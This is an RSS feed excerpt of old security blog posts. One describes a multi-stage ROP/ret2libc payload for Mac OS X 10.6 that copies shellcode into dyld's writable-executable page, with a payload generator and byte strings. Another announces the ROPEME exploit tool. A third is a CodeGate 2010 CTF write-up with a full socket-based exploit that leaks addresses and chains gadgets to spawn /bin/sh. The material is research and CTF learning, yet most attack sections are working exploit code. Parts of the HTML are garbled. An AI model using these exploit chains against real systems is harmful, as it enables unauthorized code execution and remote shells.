  #__LINKEDIT             8fe70000-8fe84000 [   80K] r&#8211;/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
</div>

<pre><strong>__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld</strong>
__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
__LINKEDIT             8fe70000-8fe84000 [   80K] r--/rwx SM=COW  /usr/lib/dyld
__DATA                 8fe42000-8fe44000 [    8K] rw-/rwx SM=PRV  /usr/lib/dyld
__DATA                 8fe44000-8fe6f000 [  172K] rw-/rwx SM=COW  /usr/lib/dyld
<strong>__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld</strong></pre>

<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">Our target is to transfer the desired shellcode to the __IMPORT section of dyld then execute it. We can simply do this with byte-per-byte copy way of <a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/">ROPEME</a>. There is some disadvantages with this method:</span></p>

<p><span style="font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px"> </span></p>

<ul>
  <li>Payload size is large, around 10 times of actual shellcode</li>
  <li>We have to re-generate the whole payload when changing to new shellcode</li>
</ul>

<p>With OS X we can do it better as there is a RWX page at static location.</p>

<h2 id="staging-payload">Staging payload</h2>

<p>The most complicated part of ROP technique is “stack pivoting” or ESP register control under ASLR. By executing a small shellcode we can take ESP under control easily. Our multi-stage payload will look like:</p>

<h3 id="stage-2-actual-shellcode">Stage-2: actual shellcode</h3>

<p>This is the last stage in our multi-stage payload. Any NULL-free shellcode can be used, e.g bind shell code from Metasploit.</p>

<h3 id="stage-1-shellcode-loader-for-stage-2-payload">Stage-1: shellcode loader for stage-2 payload</h3>

<p>This stage will transfer stage-2 payload on stack to __IMPORT section (RWX) of dyld then executes it. The transfer function is *_strcpy() *in dyld. Below small shellcode will be executed on RWX page to perform the job:</p>

<pre># 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # src -&gt; &amp;shellcode
# 50                push eax    # dst -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)</pre>

<h3 id="stage-0-ret2libc-loader-for-stage-1-payload">Stage-0: ret2libc loader for stage-1 payload</h3>

<p>This stage will transfer 7 bytes of stage-1 payload to our RWX location using repeated *_strcpy() *calls, then executes it. We lookups the dyld for necessary byte values and copy it to the target byte-per-byte.</p>

<p>In summary, there is some advantages with our multi-stage payload:</p>

<ul>
  <li>Straightforward to implement: only ret2libc calls, no gadget is required</li>
  <li>Payload size overhead is small: around 100 bytes</li>
  <li>Independent, generic loader code: no need to regenerate the whole payload, just append a new shellcode to make new payload</li>
</ul>

<h2 id="automated-payload-generator">Automated payload generator</h2>

<p>Let put all this together and make an automated payload generator in Python.</p>

<ul>
  <li>Select the target</li>
</ul>

<pre class="brush: python; title: ; notranslate" title="">#__IMPORT               8fe6f000-8fe70000 [    4K] rwx/rwx SM=COW  /usr/lib/dyld
TARGET = 0x8fe6f010 # to avoid NULL byte
# dyld base address
DYLDADDR = 0x8fe00000
</pre>

<ul>
  <li>Extract dyld’s i386 code</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># $ otool -f /usr/lib/dyld
# ...
#architecture 1
#    cputype 7
#    cpusubtype 3
#    capabilities 0x0
#    offset 352256
#    size 368080
#    align 2^12 (4096)
# ...

DYLDFILE = "/usr/lib/dyld"
DYLDCODE = open(DYLDFILE, "rb").read()
DYLDCODE = DYLDCODE[352256 : 352256+368080]
</pre>

<ul>
  <li>_strcpy() call</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># $ nm -arch i386 /usr/lib/dyld | grep _strcpy
# 8fe2db10 t _strcpy
STRCPY = 0x8fe2db10

# $ otool -arch i386 -tv /usr/lib/dyld | grep pop -A2 | grep ret -B1 | grep pop
# 8fe28790        popl    %edi
# 8fe2b3d4        popl    %edi
POP2RET = 0x8fe2878f
</pre>

<ul>
  <li>stage-1</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># stage1
# 58                pop eax     # eax -&gt; TARGET
# 5B                pop ebx     # ebx -&gt; STRCPY
# 54                push esp    # dst -&gt; &amp;shellcode
# 50                push eax    # src -&gt; TARGET
# 50                push eax    # jump to TARGET when return from _strcpy()
# 53                push ebx    # STRCPY
# C3                ret         # execute _strcpy(TARGET, &amp;shellcode)

STAGE1 = "x58x5bx54x50x50x53xc3"
</pre>

<ul>
  <li>stage-0</li>
</ul>

<pre class="brush: python; title: ; notranslate" title=""># stage0: _strcpy sequences
STAGE0 = gen_stage0(DYLDCODE, STAGE1)
</pre>

<p>Below is the stage-0 payload loader generated for OS X 10.6.4:</p>

<pre class="brush: python; title: ; notranslate" title="">STAGE0 = (  "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8f"
            "x10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8f"
            "x10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" )
</pre>

<p>Test the payload with simple buffer overflow:</p>

<pre class="brush: plain; title: ; notranslate" title="">bash-3.2$ ./vuln "`python -c 'print "A"*272 + "x10xdbxe2x8fx8fx87xe2x8fx10xf0xe6x8fx31x24xe1x8fx10xdbxe2x8fx8fx87xe2x8fx12xf0xe6x8fx32x01xe0x8fx10xdbxe2x8fx8fx87xe2x8fx13xf0xe6x8fx7ex21xe1x8fx10xdbxe2x8fx8fx87xe2x8fx15xf0xe6x8fx45x10xe0x8fx10xdbxe2x8fx8fx87xe2x8fx16xf0xe6x8fx44x10xe0x8fx10xf0xe6x8fx10xf0xe6x8fx10xdbxe2x8f" + "xcc"*4'`

...

Trace/BPT trap

bash-3.2$

</pre>

<p>Looking for the next? Maybe “Mac OS X ROP exploit on x86_64″ someday.</p>

  ]]></description>
</item>

	<item>
  <title>ROPEME &#8211; ROP Exploit Made Easy</title>
  <link>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-08-13T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/08/13/ropeme-rop-exploit-made-easy.html</guid>
  <description><![CDATA[
     <p>ROPEME – ROP Exploit Made Easy – is a PoC tool for ROP exploit automation on Linux x86. It contains a set of simple Python scripts to generate and search for ROP gadgets from binaries and libraries (e.g libc). A sample payload class is also included to help generate multistage ROP payload with the technique described in the Black Hat USA 2010 talk: “<a title="Black Hat USA 2010 Media Archives" href="http://blackhat.com/html/bh-us-10/bh-us-10-archives.html#Le" target="_blank">Payload already inside: data re-use for ROP exploits</a>“.</p>

<p>Check the latest <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">paper</a> and <a href="http://force.vnsecurity.net/download/longld/BHUS10_Slides_Payload_already_inside_data_reuse_for_ROP_exploits_v1.pdf">slides</a> and PoC <a href="http://force.vnsecurity.net/download/longld/ropeme-bhus10.tbz2">code</a>.</p>

<p>And take a look at the demo video below:</p>

<p>Enjoy ROPing!</p>


  ]]></description>
</item>

	<item>
  <title>Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-04-18T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</guid>
  <description><![CDATA[
     <p>In my <a href="http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/" target="_blank">previous post</a> about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get <em>execl()</em> address. In this post I will show how to blindly exploit the “harder” program without access to the remote server using <a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">return-oriented-programming</a> technique.</p>

<h2 id="rop-introduction">ROP introduction</h2>

<p>A worth to read post about ROP introduction can be found on Zynamics blog: <a href="http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank">http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>

<p>In summary: we will use return-into-instructions (called gadgets) to build and execute our payload when controlled EIP and ESP from vulnerable program.</p>

<p>ROP limitations (difficulties):</p>

<ul>
  <li>ASLR: the same as return-into-libc, it’s difficult to locate address of instructions in library (e.g libc)</li>
  <li>ASCII-armor address: with ascii-armor remapping of libraries (e.g libc), addresses will contain NULL byte so chaining return-into-libc calls and ROP is impossible if there’s NULL filter in input</li>
</ul>

<h2 id="the-8220harder8221-case">The “harder” case</h2>

<p>Fortunately, we can blindly exploit the “harder” program using ROP because it provides some “advantages” in code:</p>

<ul>
  <li><em>getline()</em>: can pass NULL byte to input</li>
  <li><em>printf()</em>: can leak runtime memory info (bypass ASLR)</li>
</ul>

<h2 id="finding-rop-gadgets">Finding ROP gadgets</h2>

<p>Our target is to invoke <strong>execve(“/bin/sh”, 0, 0)</strong> syscall, which is equivalent to prepare registers’ value then trigger kernel syscall:</p>

<blockquote>
  <p>eax = 0xb // execve<br />
ebx = address of “/bin/sh”<br />
ecx = 0 // argv<br />
edx = 0 // env</p>
</blockquote>

<p>Searching in harder binary, we found below gadgets:</p>

<ul>
  <li>eax: 
    <pre>80483a4:    58                       pop    %eax
80483a5:    5b                       pop    %ebx
80483a6:    c9                       leave
80483a7:    c3                       ret</pre>
  </li>
  <li>ebx &amp; ecx: 
    <pre>8048634:    59                       pop    %ecx
8048635:    5b                       pop    %ebx
8048636:    c9                       leave
8048637:    c3                       ret</pre>

    <p>“/bin/sh” is placed on target buffer, its address is available by leaking via <em>printf()</em>&lt;/li&gt; &lt;/ul&gt; 
*   edx:<br />
    There’s no edx related gadget but observing that when returned from <em>memcpy()</em> edx’s value is set to esi so we can assign esi to 0×0 first then return again to main to nullify edx.&lt;/p&gt; 
    &lt;pre&gt;0x001ba506 :    mov    edx,esi
80485e6:    5e                       pop    %esi
80485e7:    5f                       pop    %edi
80485e8:    5d                       pop    %ebp
80485e9:    c3                       ret&lt;/pre&gt;</p>

    <ul>
      <li>
        <p>syscall:<br />
In recent Linux kernel, syscall is usually performed via linux gate: <strong>call gs:[0x10]</strong>. By return to back to <em>printf()</em> in harder program many times, we can find the offset from <em>getline()</em> to first syscall is 319 bytes.</p>
      </li>
      <li>
        <p>moving stack:<br />
After <strong>“leave; ret”</strong> our stack will be moved to new location pointing by ebp. We can control this by set ebp back to somewhere in the middle of target buffer.</p>
      </li>
    </ul>

    <h2 id="exploit-code">Exploit code</h2>

    <pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python

</pre>
  </li>
</ul>
<p>import socket
import sys
import struct
import telnetlib</p>

<h1 id="host--ctf4codegateorg">host = ‘ctf4.codegate.org’</h1>
<p>host = ‘127.0.0.1’
port = 9005</p>

<p>c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect((host, port))</p>

<p>buf=””
# bypass first read
buf = c.recv(1024)</p>

<h1 id="getline-address">getline() address</h1>
<p>buf = “A”*268 + struct.pack(‘i’, 0x08048524) + struct.pack(‘i’, 0x0804a008) + “n”
c.send(buf)
buf = c.recv(1024)
addr = “”
getline_addr = int(buf[:4][::-1].encode(‘hex’), 16)
print “getline() is at:”, hex(getline_addr)</p>

<h1 id="call-gs0x10-address">call gs:[0x10] address</h1>
<p>offset = 319 # first offset is 319 bytes from getline()
syscall_addr = getline_addr + offset</p>

<h1 id="buffer-address">buffer address</h1>
<p>buf = “%7$x” + “x00”<em>260 + struct.pack(‘i’, 0x08048521)</em>2 + “n”
c.send(buf)
buf = c.recv(1024)
input_addr = int(buf[:8], 16)
print “Buffer address is at: “, hex(input_addr)</p>

<h1 id="gadgets-address">gadgets address</h1>
<p>pop_eax = 0x080483a4
pop_ecx_ebx = 0x08048634
pop_esi = 0x080485e6</p>

<h1 id="pop-esi">pop esi</h1>
<p>buf = “A”<em>268 + struct.pack(‘i’, pop_esi) + “x00” * 12 + struct.pack(‘i’, 0x08048524)</em>2  + “n”
c.send(buf)
c.recv(1024)</p>

<h1 id="pop-eax-then-move-stack-to-new-address">pop eax then move stack to new address</h1>
<p>input_addr += 560 # lifting after 2 getline() calls
new_stack = input_addr+8
buf = “/bin/shx00” # /bin/sh
buf += struct.pack(‘i’, new_stack+16) # next ebp after leave from pop_eax
buf += struct.pack(‘i’, pop_ecx_ebx) # next is pop_ecx_ebx
buf += “x00”<em>4 # ecx
buf += struct.pack(‘i’, input_addr) # ebx -&gt; /bin/sh
buf += “A”</em>4 # un-used ebp after leave from pop_ecx_ebx
buf += struct.pack(‘i’, syscall_addr)
buf = buf.ljust(264, “A”) # padding
buf += struct.pack(‘i’, new_stack) # new ebp
buf += struct.pack(‘i’, pop_eax)
buf += “x0bx00x00x00” # execve syscal
buf += “A”*4 # un-used ebx
buf += “n”</p>

<p>print “Sending final payload …”
c.send(buf)
c.send(“id 2&gt;&amp;1” + “n”*5)</p>

<p>t = telnetlib.Telnet()
t.sock = c
t.interact()
c.close()</p>

<p>&lt;/pre&gt;</p>

  ]]></description>
</item>

</channel>
</rss>